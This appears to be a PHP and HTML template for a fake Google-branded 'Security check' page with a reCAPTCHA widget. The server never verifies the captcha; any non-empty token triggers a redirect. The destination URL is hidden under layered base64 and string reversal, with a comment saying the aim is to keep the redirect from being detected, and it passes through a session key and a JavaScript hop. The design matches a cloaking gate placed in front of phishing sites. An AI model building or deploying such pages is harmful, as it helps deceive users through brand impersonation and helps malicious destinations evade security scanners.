<?php
session_start();

// Конфигурация
$config = [
    'recaptcha' => [
        'site_key' => '6LcR2XwqAAAAAKJHnXVvsJaAy8CW6pCAmtRA3BBC',
        'action' => 'LOGIN'
    ],
    // Многоуровневое кодирование URL
    'r_data' => base64_encode(strrev(base64_encode('aHR0cHM6Ly9nb29nbGUuY29t')))
];

// Обработка POST запроса
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['g-recaptcha-response']) && !empty($_POST['g-recaptcha-response'])) {
        // Многоуровневое декодирование
        $step1 = base64_decode($config['r_data']);
        $step2 = strrev($step1);
        $step3 = base64_decode($step2);
        $finalUrl = base64_decode($step3);
        
        // Дополнительная защита от прямого определения редиректа
        $randomKey = bin2hex(random_bytes(8));
        $_SESSION['r_' . $randomKey] = $finalUrl;
        
        // Промежуточный редирект через JavaScript
        echo '<script>window.location.href="redirect.php?k=' . $randomKey . '";</script>';
        exit();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Security check</title>
    <script src="https://www.google.com/recaptcha/enterprise.js" async defer></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #fff;
            color: #202124;
        }
        .container {
            background-color: #fff;
            padding: 45px 40px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }
        .google-logo {
            width: 24px;
            height: 24px;
            margin-bottom: 24px;
        }
        h1 {
            font-family: 'Roboto', Arial, sans-serif;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 16px;
            margin-top: 0;
            color: #202124;
        }
        .subtitle {
            font-size: 14px;
            font-weight: 400;
            line-height: 1.5;
            margin-bottom: 24px;
            color: #5f6368;
        }
        .recaptcha-container {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }
        button {
            background-color: #1a73e8;
            color: white;
            padding: 0 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Roboto', Arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            letter-spacing: 0.25px;
        }
        button:hover {
            background-color: #1557b0;
        }
        .footer {
            margin-top: 26px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48cGF0aCBmaWxsPSIjNDI4NWY0IiBkPSJNMjIuNTYgMTIuMjVjMC0uNzgtLjA3LTEuNTMtLjItMi4yNUgxMnYzLjI2aDUuOTJjLS4yNiAxLjM3LTEuMDQgMi41My0yLjIxIDMuMzF2Mi43N2gzLjU3YzIuMDgtMS45MiAzLjI4LTQuNzQgMy4yOC04LjA5eiIvPjxwYXRoIGZpbGw9IiMzNGE4NTMiIGQ9Ik0xMiAyM2MzLjA0IDAgNS41OS0xLjAxIDcuNDUtMi43M2wtMy41Ny0yLjc3Yy0uOTkuNjYtMi4yNiAxLjA2LTMuODggMS4wNi0yLjk3IDAtNS40OS0yLTYuNC00LjdINS4xMXYyLjg2QzcuMDQgMjAuNTQgOS4zNyAyMyAxMiAyM3oiLz48cGF0aCBmaWxsPSIjZmJiYzA1IiBkPSJNNS42IDE0Ljg2Yy0uMjMtLjY5LS4zNi0xLjQyLS4zNi0yLjE3cy4xMy0xLjQ4LjM2LTIuMTdWNy42NkgxLjY3QTExIDExIDAgMCAwIDEgMTIuNjljMCAxLjc3LjQzIDMuNDQgMS4xOCA0LjlsMS44OC0yLjczeiIvPjxwYXRoIGZpbGw9IiNlYTQzMzUiIGQ9Ik0xMiA2LjVjMS42NiAwIDMuMTQuNTggNC4zNiAxLjcybDMuMTctMy4xN0MxNy40NSAzLjAxIDE0Ljk3IDIgMTIgMiA5LjM3IDIgNy4wNCA0LjQ2IDUuMTEgOC4yNGwzLjkyIDMuMDVjLjkxLTIuNyAzLjQzLTQuNyA2LjQtNC43eiIvPjwvc3ZnPg==" alt="Google" class="google-logo">
        <h1>Security check</h1>
        <div class="subtitle">
            We need to verify that you are human.
        </div>
        <form method="POST">
            <div class="recaptcha-container">
                <div class="g-recaptcha" 
                     data-sitekey="<?php echo $config['recaptcha']['site_key']; ?>"
                     data-action="<?php echo $config['recaptcha']['action']; ?>">
                </div>
            </div>
            <button type="submit">Continue</button>
        </form>
        <div class="footer">
            This page is protected by Google reCAPTCHA
        </div>
    </div>
</body>
</html>